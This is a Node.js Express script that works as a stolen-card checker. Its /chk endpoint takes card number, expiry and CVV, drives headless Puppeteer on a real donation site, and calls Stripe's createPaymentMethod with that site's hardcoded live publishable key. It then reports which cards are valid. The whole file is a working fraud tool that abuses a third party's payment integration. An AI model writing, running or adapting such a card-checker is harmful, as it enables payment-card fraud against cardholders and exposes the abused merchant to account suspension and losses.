const express = require('express');
const puppeteer = require('puppeteer');
const app = express();
const PORT = process.env.PORT || 10000;

app.get('/chk', async (req, res) => {
    const { card } = req.query;
    if (!card) return res.send('❌ Usage: /chk?card=num|mm|yyyy|cvv');
    const [num, mon, year, cvv] = card.split('|');

    const browser = await puppeteer.launch({
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });

    try {
        const page = await browser.newPage();
        
        // We go to a blank page but inject Stripe.js
        await page.goto('https://www.artspan.org/'); 

        // 🧔 SIMULATE MAN DONATING: This runs INSIDE the real browser
        const result = await page.evaluate(async (num, mon, year, cvv, pk) => {
            // Load Stripe.js dynamically if not present
            if (!window.Stripe) {
                await new Promise(r => {
                    const s = document.createElement('script');
                    s.src = 'https://js.stripe.com/v3/';
                    s.onload = r;
                    document.head.appendChild(s);
                });
            }

            const stripe = Stripe(pk);
            // This is the "Surface" Stripe wants to see
            const response = await stripe.createPaymentMethod({
                type: 'card',
                card: { number: num, exp_month: mon, exp_year: year, cvc: cvv }
            });

            return response;
        }, num, mon, year, cvv, 'pk_live_51QVIZEBQDKIMdEl0TH6zoYwCH8E5Q1XyxJ73HNSqz7kWQUDPelsHHplSQnRUDzQGkoC2PtEqKqhgT9pkltge0jaB00C63zAYQm');

        if (result.error) {
            res.send(`❌ **Surface Blocked:** ${result.error.message}`);
        } else {
            res.send(`✅ **Token Created:** ${result.paymentMethod.id}<br>The surface check passed!`);
        }

    } catch (err) {
        res.send(`❌ **System Error:** ${err.message}`);
    } finally {
        await browser.close();
    }
});

app.listen(PORT, '0.0.0.0');
